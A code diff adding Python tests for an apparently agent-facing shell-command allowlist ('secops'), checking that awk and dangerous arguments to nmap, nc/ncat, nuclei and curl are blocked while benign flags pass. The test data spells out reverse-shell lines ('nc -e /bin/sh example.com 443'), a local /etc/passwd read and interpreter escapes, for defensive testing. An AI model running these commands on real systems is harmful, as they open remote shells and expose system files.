@@ -82,6 +82,44 @@ def test_secops_blocks_interpreters():
         assert not ok, binary
 
 
+def test_secops_blocks_awk():
+    # awk/gawk убраны из SecOps: system()/| getline = выход из allowlist
+    assert "awk" not in SECOPS_ALLOWED
+    assert "gawk" not in SECOPS_ALLOWED
+    ok, _ = secops.check("awk 'BEGIN{system(\"id\")}'")
+    assert not ok
+
+
+@pytest.mark.parametrize(
+    "cmd",
+    [
+        "nmap --script=http-shellshock example.com",  # NSE Lua os.execute
+        "nmap --script http-vuln example.com",
+        "nmap --interactive",  # старый shell-escape
+        "ncat -e /bin/sh example.com 443",  # привязать команду к сокету
+        "nc -e /bin/sh example.com 443",
+        "nuclei -code -t x.yaml -u https://example.com",  # протокол code = RCE
+        "curl file:///etc/passwd",  # чтение локального файла
+        "curl -K /tmp/evil.conf https://example.com",  # подгрузка конфига
+    ],
+)
+def test_secops_blocks_escape_args(cmd):
+    # первый бинарь разрешён, но опасный аргумент даёт выход в исполнение/ФС
+    ok, _ = secops.check(cmd)
+    assert not ok
+
+
+def test_secops_allows_benign_args_of_guarded_binaries():
+    # обычные флаги тех же бинарей не должны ложно блокироваться
+    for cmd in (
+        "nmap -sV --top-ports 100 example.com",
+        "curl -sI https://example.com",
+        "nuclei -t /opt/nuclei-templates/http/cves -u https://example.com",
+    ):
+        ok, reason = secops.check(cmd)
+        assert ok, f"{cmd}: {reason}"
+
+
 def test_chain_to_disallowed_blocked():
     # первый бинарь ок, второй — нет
     ok, reason = coder.check("pytest -q | sh")
